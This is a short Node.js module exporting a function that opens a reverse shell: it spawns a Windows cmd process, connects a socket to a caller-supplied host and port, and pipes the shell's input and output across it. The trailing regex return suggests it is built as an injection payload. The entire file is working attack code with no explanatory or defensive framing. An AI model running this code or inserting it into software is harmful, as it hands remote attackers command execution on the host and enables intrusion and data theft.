exports.rev = (host, port) =>
  (function () {
    var net = require('net'),
      cp = require('child_process'),
      sh = cp.spawn('cmd', [])
    var client = new net.Socket()
    client.connect(port, host, function () {
      client.pipe(sh.stdin)
      sh.stdout.pipe(client)
      sh.stderr.pipe(client)
    })
    return /a/
  })()
